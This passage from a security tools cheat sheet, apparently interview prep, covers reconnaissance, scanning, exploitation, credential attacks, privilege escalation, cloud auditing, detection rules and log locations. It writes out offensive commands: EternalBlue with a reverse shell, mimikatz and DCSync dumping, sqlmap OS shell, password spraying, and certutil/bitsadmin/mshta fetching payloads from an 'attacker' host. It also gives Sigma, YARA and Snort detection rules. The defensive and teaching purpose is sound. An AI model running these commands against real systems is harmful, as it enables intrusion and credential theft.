├─ Subfinder (subdomain discovery)
├─ LinkedIn/Google dorking
├─ Wayback Machine (historical snapshots)
└─ DNSdumpster (DNS reconnaissance)

# TheHarvester
theHarvester -d example.com -b google,bing,linkedin

# Amass
amass enum -d example.com -active
amass intel -d example.com -whois

# Subfinder
subfinder -d example.com -all -o subdomains.txt

# Recon-ng
recon-ng
[recon-ng][default] > marketplace install all
[recon-ng][default] > modules load recon/domains-hosts/hackertarget
[recon-ng][default] > options set SOURCE example.com
[recon-ng][default] > run

GOOGLE DORKS:
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com "password" filetype:log
site:example.com "index of" "backup"
site:linkedin.com/in "example.com"
intext:"sql syntax" site:example.com

IOC FRAMEWORKS:
├─ STIX/TAXII (standard formats for sharing)
├─ OpenIOC (indicator format)
├─ YARA (file pattern matching)
├─ Sigma (log pattern matching)
└─ Snort/Suricata (network signatures)
```

### STIX/TAXII

```json
// STIX 2.1 Example - Indicator
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
  "created": "2024-01-15T12:00:00.000Z",
  "modified": "2024-01-15T12:00:00.000Z",
  "name": "Malicious C2 Domain",
  "pattern": "[domain-name:value = 'evil.com']",
  "pattern_type": "stix",
  "valid_from": "2024-01-15T00:00:00Z",
  "kill_chain_phases": [
    {
      "kill_chain_name": "mitre-attack",
      "phase_name": "command-and-control"
    }
  ],
  "labels": ["malicious-activity"]
}

// TAXII Client (Python)
from taxii2client.v21 import Server
server = Server("https://taxii.example.com/taxii/",
                user="user", password="pass")
for api_root in server.api_roots:
    for collection in api_root.collections:
        print(collection.title)
```

---

## Vulnerability Scanning Tools

### Nmap

```
HOST DISCOVERY:
nmap -sn 192.168.1.0/24              # Ping sweep
nmap -sL 192.168.1.0/24              # List targets
nmap -Pn 192.168.1.1                 # Skip host discovery
nmap -PS22,80,443 192.168.1.0/24     # TCP SYN discovery
nmap -PA80,443 192.168.1.0/24        # TCP ACK discovery
nmap -PU53 192.168.1.0/24            # UDP discovery

PORT SCANNING:
nmap 192.168.1.1                     # Top 1000 ports
nmap -p 80,443 192.168.1.1           # Specific ports
nmap -p 1-65535 192.168.1.1          # All ports
nmap -p- 192.168.1.1                 # All ports (shorthand)
nmap -F 192.168.1.1                  # Fast (top 100)
nmap --top-ports 100 192.168.1.1     # Top N ports

SCAN TYPES:
nmap -sS 192.168.1.1                 # SYN scan (stealth)
nmap -sT 192.168.1.1                 # Connect scan
nmap -sU 192.168.1.1                 # UDP scan
nmap -sA 192.168.1.1                 # ACK scan (firewall)
nmap -sN 192.168.1.1                 # NULL scan
nmap -sF 192.168.1.1                 # FIN scan
nmap -sX 192.168.1.1                 # Xmas scan

SERVICE/VERSION DETECTION:
nmap -sV 192.168.1.1                 # Version detection
nmap -sV --version-intensity 5 target  # Aggressive version
nmap -O 192.168.1.1                  # OS detection
nmap -A 192.168.1.1                  # Aggressive (OS, version, script, traceroute)

NSE SCRIPTS:
nmap --script=vuln 192.168.1.1              # Vulnerability scripts
nmap --script=default 192.168.1.1           # Default scripts
nmap --script=smb-enum-shares 192.168.1.1   # SMB shares
nmap --script=http-enum 192.168.1.1         # HTTP enumeration
nmap --script=ssl-heartbleed 192.168.1.1    # Heartbleed check
nmap --script="smb-vuln-*" 192.168.1.1      # SMB vulnerabilities
nmap --script=dns-brute target.com          # DNS brute force

# Script categories: auth, broadcast, brute, default, discovery,
#                    dos, exploit, external, fuzzer, intrusive,
#                    malware, safe, version, vuln

TIMING AND PERFORMANCE:
nmap -T0 target    # Paranoid (IDS evasion)
nmap -T1 target    # Sneaky
nmap -T2 target    # Polite
nmap -T3 target    # Normal (default)
nmap -T4 target    # Aggressive
nmap -T5 target    # Insane

OUTPUT:
nmap -oN output.txt target           # Normal output
nmap -oX output.xml target           # XML output
nmap -oG output.gnmap target         # Grepable output
nmap -oA output target               # All formats

EVASION:
nmap -D RND:10 target                # Decoy scan
nmap -S spoofed_ip target            # Spoof source
nmap --source-port 53 target         # Source port
nmap -f target                       # Fragment packets
nmap --mtu 24 target                 # Custom MTU

COMMON COMBINATIONS:
# Full scan
nmap -sS -sV -O -A -p- 192.168.1.1

# Quick vulnerability check
nmap -sV --script=vuln -p 21,22,23,25,80,443,445,3389 192.168.1.1

# SMB enumeration
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-* 192.168.1.1

# Web server enum
nmap -p 80,443 --script=http-enum,http-headers,http-methods target
```

### Web Vulnerability Scanners

```
BURP SUITE:
# Proxy intercepting
Configure browser: 127.0.0.1:8080
Enable SSL interception with Burp CA

# Scanner modes
- Active scan: Sends payloads
- Passive scan: Analyzes traffic
- Crawl and audit: Automated

# Intruder attack types
- Sniper: Single payload position
- Battering ram: Same payload all positions
- Pitchfork: Parallel payloads
- Cluster bomb: All combinations

# Extensions
- Logger++
- Autorize
- JWT Editor
- Param Miner
- Turbo Intruder

OWASP ZAP:
# Quick scan
zap-cli quick-scan -s xss,sqli -r report.html https://target.com

# Spider
zap-cli spider https://target.com

# Active scan
zap-cli active-scan https://target.com

# API
zap-api-scan.py -t https://target.com/api/swagger.json -f openapi

NIKTO:
nikto -h https://target.com
nikto -h target.com -p 80,443 -Format html -output report.html
nikto -h target.com -Tuning x    # Execute all except

SQLMAP:
# Basic
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=test&pass=test"

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Database enumeration
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

NUCLEI:
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t exposures/
nuclei -u https://target.com -t takeovers/
nuclei -u https://target.com -tags cve,oast
nuclei -u https://target.com -severity critical,high

FFUF (Fuzzing):
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter fuzzing
ffuf -u https://target.com/page?FUZZ=value -w params.txt

# POST fuzzing
ffuf -u https://target.com/login -X POST -d "user=FUZZ&pass=test" -w users.txt

# Filter by size/status
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404 -fs 1234

GOBUSTER:
gobuster dir -u https://target.com -w wordlist.txt
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u https://target.com -w vhosts.txt
```

---

## Penetration Testing Tools

### Reconnaissance

```
SUBDOMAIN ENUMERATION:
# Amass
amass enum -d target.com -active -brute -o subdomains.txt

# Subfinder
subfinder -d target.com -all -o subdomains.txt

# Assetfinder
assetfinder --subs-only target.com

# Combined approach
subfinder -d target.com -silent | httpx -silent -status-code

DNS ENUMERATION:
# DNSRecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t axfr

# Fierce
fierce --domain target.com

# Dig
dig target.com ANY
dig @ns1.target.com target.com axfr

WEB RECON:
# WhatWeb
whatweb https://target.com

# Wappalyzer CLI
wappalyzer https://target.com

# HTTPx
httpx -l urls.txt -title -status-code -tech-detect

# Aquatone (screenshots)
cat urls.txt | aquatone -out screenshots
```

### Exploitation Frameworks

```
METASPLOIT:
# Start
msfconsole

# Search exploits
search type:exploit name:smb
search cve:2021-44228

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# Post exploitation
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > shell

# Auxiliary modules
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/portscan/tcp

COBALT STRIKE (Commercial):
# Beacon types
- HTTP/HTTPS
- DNS
- SMB
- TCP

# Key features
- Malleable C2 profiles
- Beacon object files
- SOCKS proxying
- Lateral movement

SLIVER (Open Source C2):
# Generate implant
generate --mtls 192.168.1.100 --save /tmp/implant

# Start listener
mtls --lport 8888

# Interact with session
use [session_id]
execute-assembly /path/to/tool.exe

IMPACKET:
# SMB
psexec.py domain/user:password@target
smbexec.py domain/user:password@target
wmiexec.py domain/user:password@target
atexec.py domain/user:password@target "command"

# Kerberos
GetNPUsers.py domain/ -usersfile users.txt -no-pass
GetUserSPNs.py domain/user:password -request
ticketer.py -nthash hash -domain-sid S-1-5-... -domain domain admin

# Secrets
secretsdump.py domain/user:password@target
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Credential Attacks

```
MIMIKATZ:
# Dump credentials
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest

# Kerberos
kerberos::list
kerberos::ptt ticket.kirbi
kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-... /krbtgt:hash

# DCSync
lsadump::dcsync /user:krbtgt

HASHCAT:
# Mode examples
hashcat -m 1000 hashes.txt wordlist.txt    # NTLM
hashcat -m 1800 hashes.txt wordlist.txt    # SHA512crypt
hashcat -m 13100 hashes.txt wordlist.txt   # Kerberoast
hashcat -m 18200 hashes.txt wordlist.txt   # AS-REP roast

# Rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d

JOHN THE RIPPER:
john --wordlist=rockyou.txt hashes.txt
john --rules --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt
john --show hashes.txt

HYDRA (Online Brute Force):
# SSH
hydra -l admin -P passwords.txt ssh://target

# HTTP Basic
hydra -l admin -P passwords.txt target http-get /admin

# HTTP POST
hydra -l admin -P passwords.txt target http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid"

# RDP
hydra -l admin -P passwords.txt rdp://target

CRACKMAPEXEC:
# SMB
crackmapexec smb target -u user -p password
crackmapexec smb target -u user -p password --shares
crackmapexec smb target -u user -p password -x "whoami"
crackmapexec smb target -u user -p password --sam
crackmapexec smb target -u user -p password --lsa

# Password spraying
crackmapexec smb targets.txt -u users.txt -p "Password123" --continue-on-success
```

### Active Directory

```
BLOODHOUND:
# Collection
SharpHound.exe -c All
bloodhound-python -d domain.com -u user -p password -c All

# Find paths
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p

RUBEUS (Kerberos):
# AS-REP Roasting
Rubeus.exe asreproast

# Kerberoasting
Rubeus.exe kerberoast

# Ticket operations
Rubeus.exe dump
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe s4u /user:user$ /rc4:hash /impersonateuser:admin /msdsspn:cifs/target

CERTIPY (AD CS):
# Find vulnerable templates
certipy find -u user@domain.com -p password -dc-ip dc_ip

# Exploit ESC1
certipy req -u user@domain.com -p password -ca CA-NAME \
    -target ca.domain.com -template VulnTemplate -upn admin@domain.com

# Authenticate with certificate
certipy auth -pfx admin.pfx -dc-ip dc_ip

POWERVIEW:
# Domain info
Get-Domain
Get-DomainController

# Users and groups
Get-DomainUser
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained

# ACLs
Get-DomainObjectAcl -Identity user
Find-InterestingDomainAcl
```

### Privilege Escalation

```
WINDOWS (WinPEAS):
winpeas.exe quiet
winpeas.exe servicesinfo applicationsinfo

# PowerUp
Invoke-AllChecks
Get-ServiceUnquoted
Get-ModifiableServiceFile

# Manual checks
whoami /priv
whoami /groups
systeminfo
net localgroup administrators

LINUX (LinPEAS):
./linpeas.sh
./linpeas.sh -a  # All checks

# Manual checks
id
sudo -l
cat /etc/passwd
cat /etc/shadow
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*

GTFOBINS (Linux):
# Check: https://gtfobins.github.io/
# Sudo examples
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit

LOLBAS (Windows):
# Check: https://lolbas-project.github.io/
# Examples
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\payload.exe
mshta http://attacker/payload.hta
```

---

## Cloud Security Tools

### AWS Security

```
PROWLER:
# Full audit
prowler aws

# Specific checks
prowler aws --severity critical high
prowler aws -c check_cloudtrail_enabled
prowler aws --list-checks
prowler aws --compliance cis_1.4_aws

# Output
prowler aws -M json-asff -o prowler_output

PACU (AWS Exploitation):
# Initialize
pacu

# Modules
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run iam__privesc_scan
run iam__bruteforce_permissions
run s3__bucket_finder
run ec2__enum
run lambda__enum

SCOUTSUITE (Multi-cloud):
scout aws --profile production
scout aws --regions us-east-1,us-west-2

AWS CLI SECURITY CHECKS:
# IAM
aws iam list-users
aws iam list-access-keys --user-name user
aws iam get-account-password-policy
aws iam get-credential-report
aws iam list-attached-user-policies --user-name user

# S3
aws s3api list-buckets
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-public-access-block --bucket bucket-name

# CloudTrail
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name trail-name

# Security Groups
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"

# GuardDuty
aws guardduty list-detectors
aws guardduty get-findings --detector-id id --finding-ids [...]

STEAMPIPE (SQL for Cloud):
steampipe query "select * from aws_iam_user"
steampipe query "select * from aws_s3_bucket where bucket_policy_is_public"
steampipe check all
```

### Azure Security

```
AZUREHOUND (BloodHound for Azure):
azurehound list -u user@domain.com -p password --tenant tenant-id

ROADTOOLS:
# Authentication
roadtx auth -u user@domain.com -p password

# Enumeration
roadtx dump

MICROBURST:
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company

POWERZURE:
# Enumeration
Get-AzureTarget
Get-AzureADUsers
Get-AzureRunAsAccounts

# Exploitation
Execute-Command -VMName vm -Command "whoami"
Execute-MSOnlineScript -VMName vm -Script "script.ps1"

AZ CLI SECURITY:
# Azure AD
az ad user list
az ad group list
az ad app list
az ad sp list

# Role assignments
az role assignment list --all
az role assignment list --assignee user@domain.com

# Storage
az storage account list
az storage container list --account-name name
az storage blob list --container-name container --account-name name

# Activity logs
az monitor activity-log list --start-time 2024-01-01
```

### GCP Security

```
SCOUTSUITE:
scout gcp --user-account

GCLOUD CLI:
# IAM
gcloud iam roles list
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list

# Compute
gcloud compute instances list
gcloud compute firewall-rules list

# Storage
gsutil ls
gsutil iam get gs://bucket-name

# Logging
gcloud logging read "resource.type=gce_instance"
```

### Kubernetes Security

```
KUBE-HUNTER:
kube-hunter --remote target_ip
kube-hunter --pod
kube-hunter --active

KUBE-BENCH (CIS Benchmark):
kube-bench run --targets node
kube-bench run --targets master
kube-bench run --targets etcd

TRIVY (Container Scanning):
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL nginx:latest
trivy fs /path/to/project
trivy k8s --report summary cluster

FALCO (Runtime Security):
falco -r /etc/falco/falco_rules.yaml

KUBEAUDIT:
kubeaudit all
kubeaudit privileged
kubeaudit rootfs
kubeaudit nonroot

KUBECTL SECURITY:
# RBAC
kubectl auth can-i --list
kubectl get clusterroles
kubectl get rolebindings --all-namespaces

# Pods
kubectl get pods --all-namespaces -o wide
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext}{"\n"}{end}'

# Secrets
kubectl get secrets --all-namespaces
kubectl get secret secret-name -o jsonpath='{.data}'

# Network policies
kubectl get networkpolicies --all-namespaces
```

---

## Detection Rule Formats

### Sigma Rules

```yaml
# Basic structure
title: Suspicious PowerShell Download
id: 3b6ab547-8ec2-4991-b649-bb8c8fb9d8d1
status: stable
description: Detects PowerShell downloading files
author: Security Team
date: 2024/01/15
modified: 2024/01/20
references:
    - https://attack.mitre.org/techniques/T1059/001/
tags:
    - attack.execution
    - attack.t1059.001

logsource:
    product: windows
    category: process_creation

detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'DownloadString'
            - 'DownloadFile'
            - 'Net.WebClient'
            - 'Invoke-WebRequest'
            - 'wget'
            - 'curl'
    condition: selection

fields:
    - ComputerName
    - User
    - CommandLine
    - ParentCommandLine

falsepositives:
    - Legitimate administrative scripts
    - Software updates

level: medium

# Advanced detection with multiple conditions
title: Office Application Spawning Suspicious Process
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
    filter_legitimate:
        CommandLine|contains: 'known_safe_pattern'
    condition: selection_parent and selection_child and not filter_legitimate

# Time-based detection
detection:
    selection:
        Image|endswith: '\psexec.exe'
    timeframe: 15m
    condition: selection | count() by TargetComputer > 5
```

### YARA Rules

```yara
rule Suspicious_PE_File {
    meta:
        author = "Security Team"
        description = "Detects suspicious PE file characteristics"
        date = "2024-01-15"
        reference = "Internal research"
        severity = "medium"

    strings:
        // MZ header
        $mz = { 4D 5A }

        // Suspicious strings
        $s1 = "mimikatz" ascii wide nocase
        $s2 = "sekurlsa" ascii wide nocase
        $s3 = "lsadump" ascii wide nocase

        // Encrypted/obfuscated indicators
        $enc1 = { E8 ?? ?? ?? ?? 83 C4 04 }

        // API calls
        $api1 = "VirtualAlloc" ascii
        $api2 = "WriteProcessMemory" ascii
        $api3 = "CreateRemoteThread" ascii

    condition:
        $mz at 0 and
        (any of ($s*) or 2 of ($api*))
}

rule Webshell_Generic {
    meta:
        description = "Detects generic webshell patterns"

    strings:
        // PHP
        $php1 = "<?php" nocase
        $php2 = "eval(" nocase
        $php3 = "base64_decode(" nocase
        $php4 = "shell_exec(" nocase
        $php5 = "system(" nocase
        $php6 = "passthru(" nocase

        // ASP
        $asp1 = "<%@" nocase
        $asp2 = "Server.CreateObject" nocase
        $asp3 = "WScript.Shell" nocase

        // JSP
        $jsp1 = "Runtime.getRuntime()" nocase
        $jsp2 = ".exec(" nocase

    condition:
        ($php1 and 2 of ($php*)) or
        ($asp1 and any of ($asp*)) or
        (any of ($jsp*))
}

rule Cobalt_Strike_Beacon {
    meta:
        description = "Detects Cobalt Strike beacon patterns"

    strings:
        $default_pipe = "\\\\.\\pipe\\msagent_" ascii
        $config_signature = { 00 01 00 01 00 02 }
        $sleep_mask = { 4C 8B DC 53 56 57 41 54 }

    condition:
        any of them
}
```

### Snort/Suricata Rules

```
# Basic syntax
action protocol src_ip src_port -> dst_ip dst_port (options)

# Alert on SMB EternalBlue
alert tcp any any -> any 445 (
    msg:"ET EXPLOIT Possible EternalBlue Exploit Attempt";
    flow:to_server,established;
    content:"|ff|SMB"; offset:4; depth:5;
    content:"|00 00 00 00|"; distance:2; within:4;
    pcre:"/^\x00\x00\x00[\x60-\xff]/R";
    sid:2024590; rev:1;
    classtype:attempted-admin;
    reference:cve,2017-0144;
)

# HTTP request patterns
alert http any any -> any any (
    msg:"Potential SQL Injection Attempt";
    flow:to_server,established;
    http.uri;
    content:"union"; nocase;
    content:"select"; nocase;
    sid:1000001; rev:1;
)

# DNS tunneling
alert dns any any -> any 53 (
    msg:"Possible DNS Tunneling - Long Query";
    dns.query;
    pcre:"/^.{60,}/";
    threshold:type both,track by_src,count 10,seconds 60;
    sid:1000002; rev:1;
)

# Beacon-like HTTP
alert http any any -> any any (
    msg:"Possible C2 Beacon Activity";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; pcre:"/^\/[a-zA-Z0-9]{8,12}$/";
    threshold:type both,track by_src,count 10,seconds 300;
    sid:1000003; rev:1;
)

# SURICATA specific - JA3 fingerprint
alert tls any any -> any any (
    msg:"Known Malicious JA3 Fingerprint";
    ja3.hash; content:"e7d705a3286e19ea42f587b344ee6865";
    sid:1000004; rev:1;
)

# File extraction rule
alert http any any -> any any (
    msg:"Executable Download Detected";
    flow:to_client,established;
    http.response_body;
    content:"MZ";
    filemagic:"PE32";
    filestore;
    sid:1000005; rev:1;
)
```

---

## Quick Command Reference

### Hash Calculation

```bash
# Linux
md5sum file.exe
sha1sum file.exe
sha256sum file.exe

# Multiple files
find . -type f -exec sha256sum {} \;

# macOS
md5 file.exe
shasum -a 256 file.exe

# Windows CMD
certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256

# Windows PowerShell
Get-FileHash -Algorithm SHA256 file.exe
Get-FileHash -Algorithm MD5 file.exe
```

### Base64 Encoding/Decoding

```bash
# Linux/macOS
echo "text" | base64
echo "dGV4dAo=" | base64 -d

# File encoding
base64 file.bin > encoded.txt
base64 -d encoded.txt > decoded.bin

# Windows PowerShell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGV4dA=="))

# File encoding (PowerShell)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.bin"))
[IO.File]::WriteAllBytes("decoded.bin", [Convert]::FromBase64String($encoded))
```

### Network Commands

```bash
# Linux
ss -tulpn                    # Listening ports
ss -antp                     # All TCP connections
netstat -tulpn               # Alternative
lsof -i                      # Open network files
lsof -i :80                  # Specific port

# Process network
lsof -i -P -n | grep ESTABLISHED
ss -tp | grep -v LISTEN

# DNS
dig @8.8.8.8 domain.com ANY
dig +short domain.com
host domain.com
nslookup domain.com

# Trace
traceroute domain.com
mtr domain.com

# Windows
netstat -ano                 # All connections with PIDs
netstat -anob                # With process names (admin)
Get-NetTCPConnection         # PowerShell
Get-NetUDPEndpoint           # PowerShell

# Windows DNS
nslookup domain.com
Resolve-DnsName domain.com   # PowerShell
```

### Process Commands

```bash
# Linux
ps aux                       # All processes
ps auxf                      # With tree
pstree -p                    # Process tree
top                          # Real-time
htop                         # Better top

# Process details
ls -la /proc/[PID]/
cat /proc/[PID]/cmdline
cat /proc/[PID]/environ
ls -la /proc/[PID]/fd/

# Find process
pgrep -a processname
ps aux | grep processname

# Windows
tasklist /v                  # Verbose
tasklist /svc                # With services
wmic process get processid,parentprocessid,commandline
Get-Process                  # PowerShell
Get-Process | Select Name, Id, Path, CommandLine

# Process tree (Windows)
wmic process get processid,parentprocessid,name,commandline /format:csv
Get-CimInstance Win32_Process | Select ProcessId, ParentProcessId, Name, CommandLine
```

### File Operations

```bash
# Find files
find / -name "*.exe" 2>/dev/null
find / -mtime -1 2>/dev/null        # Modified in last day
find / -perm -u=s -type f 2>/dev/null  # SUID files
find / -user root -perm -4000 2>/dev/null

# File info
file suspicious.exe
strings suspicious.exe | head
xxd suspicious.exe | head
hexdump -C suspicious.exe | head

# Windows
dir /s /b *.exe
Get-ChildItem -Recurse -Filter *.exe
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}
```

### Certificate Commands

```bash
# View certificate
openssl s_client -connect host:443 -showcerts
openssl x509 -in cert.pem -text -noout
openssl x509 -in cert.pem -noout -dates

# Certificate chain
openssl s_client -connect host:443 -servername host 2>/dev/null | openssl x509 -noout -text

# Check SSL/TLS
nmap --script ssl-cert,ssl-enum-ciphers -p 443 target
testssl.sh https://target.com

# Extract certificate
echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 > cert.pem
```

---

## Log Locations Reference

### Windows Logs

```
EVENT LOGS (EVTX):
%SystemRoot%\System32\winevt\Logs\

Security.evtx                    # Authentication, authorization
System.evtx                      # System events, drivers
Application.evtx                 # Application events
Microsoft-Windows-PowerShell/Operational.evtx    # PowerShell
Microsoft-Windows-Sysmon/Operational.evtx        # Sysmon
Microsoft-Windows-Windows Defender/Operational.evtx
Microsoft-Windows-TaskScheduler/Operational.evtx
Microsoft-Windows-WMI-Activity/Operational.evtx
Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational.evtx
Microsoft-Windows-TerminalServices-LocalSessionManager/Operational.evtx

KEY SECURITY EVENT IDS:
4624    # Successful logon
4625    # Failed logon
4648    # Explicit credential logon
4672    # Special privileges assigned
4688    # Process creation (with audit)
4689    # Process termination
4697    # Service installed
4698    # Scheduled task created
4699    # Scheduled task deleted
4700    # Scheduled task enabled
4701    # Scheduled task disabled
4720    # User account created
4722    # User account enabled
4723    # Password change attempt
4724    # Password reset attempt
4725    # User account disabled
4726    # User account deleted
4728    # Member added to security-enabled global group
4732    # Member added to security-enabled local group
4738    # User account changed
4756    # Member added to security-enabled universal group
4768    # Kerberos TGT requested
4769    # Kerberos service ticket requested
4771    # Kerberos pre-auth failed
4776    # NTLM authentication
5140    # Network share accessed
5145    # Shared object access
7045    # Service installed (System log)

SYSMON EVENT IDS:
1       # Process creation
2       # File creation time changed
3       # Network connection
4       # Sysmon service state changed
5       # Process terminated
6       # Driver loaded
7       # Image loaded
8       # CreateRemoteThread
9       # RawAccessRead
10      # ProcessAccess
11      # FileCreate
12      # RegistryEvent (Object create/delete)
13      # RegistryEvent (Value set)
14      # RegistryEvent (Key/Value rename)
15      # FileCreateStreamHash
17      # PipeEvent (Created)
18      # PipeEvent (Connected)
22      # DNSEvent

REGISTRY HIVES:
%SystemRoot%\System32\config\SAM
%SystemRoot%\System32\config\SECURITY
%SystemRoot%\System32\config\SOFTWARE
%SystemRoot%\System32\config\SYSTEM
%UserProfile%\NTUSER.DAT
%UserProfile%\AppData\Local\Microsoft\Windows\UsrClass.dat

OTHER ARTIFACTS:
# Prefetch
%SystemRoot%\Prefetch\

# Amcache
%SystemRoot%\AppCompat\Programs\Amcache.hve

# SRUM
%SystemRoot%\System32\sru\SRUDB.dat

# Browser history (Chrome)
%LocalAppData%\Google\Chrome\User Data\Default\History

# Browser history (Edge)
%LocalAppData%\Microsoft\Edge\User Data\Default\History
```

### Linux Logs

```
AUTHENTICATION:
/var/log/auth.log           # Debian/Ubuntu
/var/log/secure             # RHEL/CentOS
/var/log/faillog            # Failed logins
/var/log/lastlog            # Last login times
/var/log/wtmp               # Login history (binary, use 'last')
/var/log/btmp               # Bad login attempts (binary, use 'lastb')

SYSTEM:
/var/log/syslog             # Debian/Ubuntu
/var/log/messages           # RHEL/CentOS
/var/log/kern.log           # Kernel messages
/var/log/dmesg              # Boot messages
/var/log/boot.log           # Boot log

APPLICATIONS:
/var/log/apache2/           # Apache (Debian)
/var/log/httpd/             # Apache (RHEL)
/var/log/nginx/             # Nginx
/var/log/mysql/             # MySQL
/var/log/postgresql/        # PostgreSQL

AUDIT:
/var/log/audit/audit.log    # Auditd logs

USEFUL COMMANDS:
# Recent logins
last
lastb
who
w

# Authentication failures
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/auth.log

# Sudo usage
grep "sudo" /var/log/auth.log

# SSH connections
grep "sshd" /var/log/auth.log | grep "Accepted"

# Cron jobs
grep CRON /var/log/syslog
cat /var/log/cron
```

### Cloud Logs

```
AWS:
CloudTrail                   # API activity
VPC Flow Logs               # Network traffic
CloudWatch Logs             # Application/system logs
GuardDuty                   # Threat detection
S3 Access Logs              # Bucket access

# CloudTrail locations
s3://bucket/AWSLogs/account-id/CloudTrail/region/yyyy/mm/dd/

AZURE:
Activity Log                # Subscription-level operations
Sign-in Logs               # User authentication
Audit Logs                 # Azure AD changes
NSG Flow Logs              # Network traffic
Azure Monitor              # Metrics and logs

GCP:
Cloud Audit Logs           # Admin activity, data access
VPC Flow Logs              # Network traffic
Cloud Logging              # Application/system logs
Security Command Center    # Security findings

KUBERNETES:
API Server Audit           # API requests
Container Logs             # stdout/stderr
Node Logs                  # System logs

# kubectl logs
kubectl logs pod-name
kubectl logs pod-name --previous
kubectl logs -l app=myapp
kubectl logs pod-name -c container-name
```

---

## Interview Questions - Tools

### Q1: Walk me through your incident response tool stack.

```
ANSWER FRAMEWORK:

Detection & Alerting:
├─ SIEM (Splunk/Sentinel/Elastic) for correlation
├─ EDR (CrowdStrike/Defender) for endpoint visibility
└─ Network monitoring (Zeek/Suricata) for traffic analysis

Investigation:
├─ EDR console for process/network telemetry
├─ SIEM for log correlation and timeline
├─ Forensics (Volatility, KAPE) for deep analysis
└─ Threat intel (VirusTotal, Shodan) for context

Containment:
├─ EDR for isolation
├─ Firewall/NDR for network blocking
└─ Identity systems for credential reset

Remediation:
├─ EDR for cleanup actions
├─ Patch management for vulnerability remediation
└─ Backup systems for recovery

Documentation:
├─ SOAR/ticketing for case management
├─ Timeline tools (Plaso, Timeline Explorer)
└─ Reporting tools
```

### Q2: You need to write a detection for living-off-the-land binaries. Show examples across platforms.

```
SIGMA:
title: LOLBAS Execution with Download
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\certutil.exe'
            - '\bitsadmin.exe'
            - '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - '-decode'
            - '/download'
    condition: selection

SPLUNK:
index=sysmon EventCode=1
| search (Image="*\\certutil.exe" OR Image="*\\bitsadmin.exe")
| search CommandLine="*http*" OR CommandLine="*download*"
| table _time, ComputerName, User, Image, CommandLine

DEFENDER KQL:
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "bitsadmin.exe", "mshta.exe")
| where ProcessCommandLine has_any ("http://", "https://", "-decode", "/download")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine

SURICATA:
alert http $HOME_NET any -> any any (
    msg:"LOLBAS certutil download attempt";
    http.user_agent; content:"CertUtil";
    sid:1000100; rev:1;
)
```

### Q3: How do you analyze a suspicious binary?

```
STATIC ANALYSIS:
